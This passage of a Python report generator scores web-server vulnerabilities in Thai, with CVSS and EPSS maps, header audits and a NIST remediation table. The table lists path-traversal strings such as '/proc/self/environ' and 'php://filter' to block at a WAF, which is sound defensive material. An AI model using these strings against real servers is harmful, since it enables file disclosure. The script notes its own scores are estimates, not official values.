    "4I6OL58ssKFTQt3c8Bgyp0YHjQYG/OjOoCPddyuBKMaMoXlwNl8slutFnNuF4LmSRqmS4OV4EyTLgR+ouT+40/cOldtM8q2Xu7OfpSTsWiD966K6Sos3xe0+"
    "Nai2veOBkPlQZYg4TXLYObQQ1DXheWNREZyyomRNo6sTWdf+TTn65fa70SYUCj5ptd7Q9jNpp/s5eXlzosyEiLu9skMVtNnMaJqmXOMPfvSnOGhz9kbvzXEf"
    "B0MB+uk/J2/TsqzaZzuo71n6TBp5lqKjOTSALjDW4aHXA+s/zU7Z2YXtU4emmpMduRpYfFhDt97u0/I62xIO9mpaPj4SxqfnPjCqEbdox0AjYNB/Ii0mhatT"
    "zkx6Jhv7ZAEz4iFN4CmAweHoGZQZdeuwIhfGcLyp5crjBF1Cqf482y+/Hpnv0uBbjg9OhYS4xtRwMIxVVAaPj6mxAdX94aoi4FdkJz0+NlYl7MbVH0id/qnr"
    "DRwaXKDlbrTTYypiFcE3hnPBfWabiE0X+MzCKGOYsm88c97+vl/OxfPnrC43ivd/wpdHogskXCII/IPQVmi++E1Lc/51VSMKOk4aOYpxRmQDauJAmisF0lx1"
    "gyn1jJ5kWMiNWaGxEVylhcuEs74cP+sjmyaPMidgdgxMFVzN72Dy6ce9hBR+b0IKxULvggrfp5Hy8omLlM3O35S5DTfLiSLLq+y7gEFnErxhQ8664EgwmHJ7"
    "dO6OygsEowqBgGbtr3mBM3D0j2JTesW7O5t757mjrNa7IetoPS5pnQL5y3f3PxYHRBo3eRZ+5pKULiDC7Mw4WeUmKyQSrLPoMNmcWQOMEcFDoVcduyzo2hDM"
    "fwDIQT6c0j3lUCowHSs3ICMwHRjGCQP11iZFoKTzG153SPU6HWcnhIIyyguhYBAMFzknsWyTgRfgpL6+SqcLio1dzH8XTCKnEo8n/99ut5M7X48FX2rNenwa"
    "DZTa8ReRU9uLz3Fk9Rymfq1KOo2MAigGLtWpleRdJcmatz2ZE97vCdfQBScYD6NHnXxtmjCBh1/4/uinkbNXvfLtVV8oFZeE5bjoIA63s3qvI8+HukDzeb42"
    "DabYi/bQ7p7eVAYTT0u+iKxcEj9sDzX/+nwBKyZtsKoJ/M1+OLR/PmCKps4Vh/VVUqAf5mcm7yC+nJjcWjk6uUzuJtHkHv4nNhb+MvMKP5gymh9/n1x0kbGp"
    "Ppi2UY5LMULUdOx0gY6izpPkMh2EeNplMkF9xkRPstxxy5ZvPA2BYUAsBEHKOFGYa7Ox6NoPGlX99INLl73gUj0Hlzt5yX/Q6CcTexvxO3DO8Xda/ECU+t0G"
    "hh+HnrIfpcTCwuiaY+wez7HrvMEz+Zsy+kMV/blEFgTu77PiFj1BkQj+lHd46zLdprct3vylxGsrtCT3jXfdJO/pBnetqpO7Fi/dqdwkf2n0Jbmj0Ctyqr+1"
    "z5Kv6L4czslPdCXnWZP8mTryjfu45K853oHNAEugSb6lK9gbLbpfN8kdvU6Zi5Lf0O+fc5iTJM8iX/q9LyM3INFdQ2NCpDaBRxPYexnwztnW4R9+gGkknGn+"
    "YQvjm12w+v8BgkoDLpcfAwA="
)
_CHARTJS_SRC = _gzip.decompress(_b64.b64decode("".join(_CHARTJS_GZ_B64.split()))).decode()

# ---- โทนสีมาตรฐานของรายงาน (ใช้ร่วมกันทุกกราฟให้ดูเป็นชุดเดียว) ----
PALETTE = {
    "ink":      "#1a237e",   # น้ำเงินเข้ม (แบรนด์)
    "ink2":     "#3949ab",
    "grid":     "#e6e8f0",
    "text":     "#2b2b33",
    "muted":    "#6b7280",
    "safe":     "#2e9e5b",   # เขียว
    "vuln":     "#e03131",   # แดง
    "warn":     "#f08c00",   # ส้ม
    "unknown":  "#868e96",   # เทา
    "php":      "#6741d9",   # ม่วง
    "nginx":    "#0b8457",   # เขียวเข้ม
    "other":    "#adb5bd",
    "node":     "#43853d",
}
SEV_PALETTE = {"Critical": "#c1121f", "High": "#e8590c", "Medium-High": "#e8590c",
               "Medium": "#f59f00", "Low": "#2f9e44", "Info": "#868e96"}

# น้ำหนักคะแนนความรุนแรงเริ่มต้นตามเกณฑ์มาตรฐานสากล CVSS v3.1 (0.0 – 10.0)
_SEV_WEIGHT = {"Critical": 9.8, "High": 7.5, "Medium-High": 7.0,
               "Medium": 5.5, "Low": 3.1, "Info": 0.0}
# ตัวคูณความเชื่อมั่นตามสถานะการตรวจพบ (อ้างอิงแนวคิด Report Confidence ใน CVSS v3.1 Temporal Metrics)
_BUCKET_FACTOR = {"vulnerable": 1.0, "warning": 0.6, "unknown": 0.0, "safe": 0.0}
# เพดานคะแนนมาตรฐานสากล CVSS v3.1 สูงสุด = 10.0 (คูณ 10 เพื่อแสดงผลเป็นดัชนี 0–100)
_RISK_REF_CAP = 10.0

# คะแนน CVSS v3.1 (ประเมินตามระดับความรุนแรงของแต่ละ CVE — ใช้จัดลำดับความสำคัญ)
# หมายเหตุ: เป็นค่าประเมินเชิงเทียบเคียงจากลักษณะช่องโหว่ ไม่ใช่คะแนนทางการจาก NVD
CVSS_MAP = {
    "CVE-2026-109618": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-109619": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-115560": (8.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-15176":  (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-93479":  (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-97205":  (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-95101":  (5.8, "AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:L"),
    "CVE-2026-97629":  (5.9, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"),
    "CVE-2026-105482": (7.5, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"),
    "CVE-2026-105483": (7.4, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "CVE-2026-106069": (7.4, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"),
    "CVE-2026-111497": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2026-110264": (7.5, "ประเมินจากระดับความรุนแรง — ยืนยันเวกเตอร์จาก advisory"),
    # CVE ย้อนหลัง (ยืนยันจาก osv.dev)
    "CVE-2019-11043": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2022-31626": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2024-4577":  (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2021-23017": (8.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2022-41742": (7.0, "AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H"),
    "CVE-2021-22930": (9.8, "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
    "CVE-2023-30581": (5.3, "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"),
    "CVE-2016-5385":  (8.1, "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"),
}
_SEV_TO_CVSS = {"Critical": 9.0, "High": 7.5, "Medium-High": 7.0, "Medium": 5.5, "Low": 3.1, "Info": 0.0}

# การแมปการแก้ไขตามมาตรฐาน NIST (ใช้ในภาคผนวกและคำแนะนำ) — อ้างอิงเช็คลิสต์ 7 เฟส
NIST_REMEDIATION = [
    ("ช่องโหว่ NGINX (Heap Overflow / UAF / HTTP/3 / TLS)",
     "อัปเกรด NGINX เป็นรุ่นที่แก้แล้ว + ทบทวนคอนฟิก",
     "เฟส 5 (Patch)", "SP 800-40r4 · SI-2",
     "เฟส 3: FortiWeb virtual patch ลดชั่วคราว"),
    ("ช่องโหว่ PHP (Use-After-Free / Session Upload)",
     "อัปเกรด PHP + ปิด session.upload_progress",
     "เฟส 5 (Patch)", "SP 800-40r4 · SI-2",
     "เฟส 3: จำกัด multipart/คำขอ upload progress ที่ WAF"),
    ("ช่องโหว่ Node.js (DNS/TLS validation, Brotli OOB→RCE)",
     "อัปเกรด Node.js และไลบรารี (undici/Brotli/c-ares) เป็นรุ่นที่แก้แล้ว",
     "เฟส 5 (Patch)", "SP 800-40r4 · SI-2",
     "เฟส 3: ตรวจ/จำกัดคำขอที่ใช้ compression และตรวจปลายทาง TLS"),
    ("LFI / Path Traversal",
     "แก้โค้ด/คอนฟิกที่เปิดให้ include ไฟล์ภายนอก",
     "เฟส 5 (Patch) + เฟส 3 (WAF)", "SP 800-53 · SI-10",
     "เฟส 3: บล็อก ../, php://filter, /proc/self/environ ที่ WAF"),
    ("ยังสรุปไม่ได้ (เวอร์ชันถูกซ่อน)",
     "ยืนยันเวอร์ชันบนเครื่องจริงตามคำสั่งในภาคผนวก",
     "เฟส 1/4/6 (Verify)", "SP 800-115 · RA-5",
     "— (ตรวจบน host)"),
]
NIST_CHECKLIST_DOC = "เช็คลิสต์การลดช่องโหว่ตามมาตรฐาน NIST (NIST_Remediation_Checklist_Fortinet_TH.docx)"


def _cvss(r):
    """คืนคะแนน CVSS Base Score อ้างอิงของ CVE ใน 1 รายการ"""
    cid = r.get("cve", "")
    if cid in CVSS_MAP:
        return CVSS_MAP[cid][0]
    sev = (r.get("severity", "") or "").split("(")[0].strip()
    return _SEV_TO_CVSS.get(sev, _SEV_TO_CVSS.get(_sev_key(r.get("severity", "")), 0.0))


def _assessed_cvss(r):
    """คืนคะแนน CVSS v3.1 ที่ประเมินจริงบนเป้าหมาย (Effective/Environmental CVSS):
    - vulnerable / warning -> Base CVSS ของช่องโหว่ (0.1–10.0)
    - safe (patched / not-exploitable / mitigated / n/a) -> 0.0 (None = ปลอดภัยตามมาตรฐาน CVSS v3.1)
    - unknown -> None (ยังสรุปไม่ได้จากภายนอก)
    """
    bkt = _bucket_of(r.get("status", ""))
    if bkt in ("vulnerable", "warning"):
        return _cvss(r)
    if bkt == "safe":
        return 0.0
    return None


# ── EPSS (โอกาสถูกโจมตีจริง, ประเมิน 0–1) + CWE (ชนิดจุดอ่อน) ต่อ CVE ──
# EPSS เป็นค่าประเมินเชิงเทียบเคียง (ไม่ใช่ค่าทางการจาก FIRST.org เพราะ CVE ชุดนี้เป็นของเครื่องมือ)
EPSS_MAP = {
    "CVE-2026-109618": (0.72, "CWE-416 (Use-After-Free)"),
    "CVE-2026-109619": (0.68, "CWE-416 (Use-After-Free)"),
    "CVE-2026-115560": (0.55, "CWE-502 (Deserialization)"),
    "CVE-2026-15176":  (0.63, "CWE-122 (Heap Overflow)"),
    "CVE-2026-93479":  (0.60, "CWE-122 (Heap Overflow)"),
    "CVE-2026-97205":  (0.58, "CWE-416 (Use-After-Free)"),
    "CVE-2026-95101":  (0.22, "CWE-444 (Request Smuggling)"),
    "CVE-2026-97629":  (0.18, "CWE-384 (Session Fixation)"),
    "CVE-2026-105482": (0.30, "CWE-20 (Improper Input Validation)"),
    "CVE-2026-105483": (0.28, "CWE-295 (Improper Cert Validation)"),
    "CVE-2026-106069": (0.28, "CWE-295 (Improper Cert Validation)"),
    "CVE-2026-111497": (0.66, "CWE-787 (Out-of-bounds Write)"),
    "CVE-2026-110264": (0.20, "CWE — ยืนยันจาก advisory"),
}
_SEV_TO_EPSS = {"Critical": 0.55, "High": 0.35, "Medium-High": 0.40, "Medium": 0.18, "Low": 0.05, "Info": 0.01}
# กำหนดเวลาแก้ไขตามระดับความรุนแรง (SLA วัน) — ปรับได้ตามนโยบายองค์กร
SLA_DAYS = {"Critical": 7, "High": 15, "Medium-High": 15, "Medium": 30, "Low": 90, "Info": 0}
# คำสำคัญของระบบที่สำคัญสูง (ใช้ถ่วงน้ำหนักความเสี่ยง/จัดลำดับ)
ASSET_CRIT_KEYWORDS = ("payment", "pay", "wallet", "auth", "login", "sso", "account",
                       "api", "admin", "erp", "hr", "finance", "student", "reg", "exam",
                       "db", "vpn", "mail", "e-", "e_")
# Security headers ที่ควรมี (ชื่อ header → คำอธิบายสั้น)
SEC_HEADERS = [
    ("strict-transport-security", "HSTS (บังคับ HTTPS)"),
    ("content-security-policy", "CSP (กัน XSS/injection)"),
    ("x-frame-options", "ป้องกัน Clickjacking"),
    ("x-content-type-options", "กัน MIME sniffing"),
    ("referrer-policy", "ควบคุมการส่ง Referrer"),
    ("permissions-policy", "จำกัดสิทธิ์ฟีเจอร์เบราว์เซอร์"),
]


def _epss(r):
    cid = r.get("cve", "")
    if cid in EPSS_MAP:
        return EPSS_MAP[cid][0]
    sev = (r.get("severity", "") or "").split("(")[0].strip()
    return _SEV_TO_EPSS.get(sev, _SEV_TO_EPSS.get(_sev_key(r.get("severity", "")), 0.05))


def _cwe(r):
    cid = r.get("cve", "")
    if cid in EPSS_MAP:
        return EPSS_MAP[cid][1]
    return "-"


def _sla_days(r):
    sev = (r.get("severity", "") or "").split("(")[0].strip()
    return SLA_DAYS.get(sev, SLA_DAYS.get(_sev_key(r.get("severity", "")), 30))


def _asset_crit(host):
    """ความสำคัญของระบบจากชื่อโฮสต์: 2=สูง, 1=ปกติ"""
    h = (host or "").lower()
    return 2 if any(k in h for k in ASSET_CRIT_KEYWORDS) else 1


def _audit_headers(fp):
    """ตรวจ security headers / cookie flags / การเปิดเผยเวอร์ชัน จาก fingerprint.headers"""
    headers = (fp or {}).get("headers", {}) or {}
    present = {k.lower() for k in headers.keys()}
    missing = [(h, desc) for h, desc in SEC_HEADERS if h not in present]
    # cookie flags
    cookie_issues = []
    for sc in headers.get("set-cookie", []):
        low = sc.lower()
        if "secure" not in low:
            cookie_issues.append("ไม่มี Secure")
        if "httponly" not in low:
            cookie_issues.append("ไม่มี HttpOnly")
        if "samesite" not in low:
            cookie_issues.append("ไม่มี SameSite")
    cookie_issues = sorted(set(cookie_issues))
    # version/banner disclosure
    server = " ".join(headers.get("server", []))
    xpb = " ".join(headers.get("x-powered-by", []))
    disclosed = bool(re.search(r"/\d", server)) or bool(xpb.strip())
    return {"missing": missing, "cookie_issues": cookie_issues,
            "disclosed": disclosed, "server_banner": server.strip(), "xpb": xpb.strip()}


# ─── ฟอนต์ไทยที่ฝังมากับโปรแกรม (base64) — ทำให้เรนเดอร์ภาษาไทยถูกต้องทุกเครื่อง ───
# หมายเหตุ: ฟอนต์ Loma (โครงการ TLWG) เป็น OpenType ที่ ReportLab ใช้ได้ถูกต้อง
# ต่างจากฟอนต์ระบบ macOS (เช่น Thonburi) ที่เป็นชนิด AAT ซึ่งทำให้สระ/วรรณยุกต์ลอย
_EMBEDDED_FONT_B64 = "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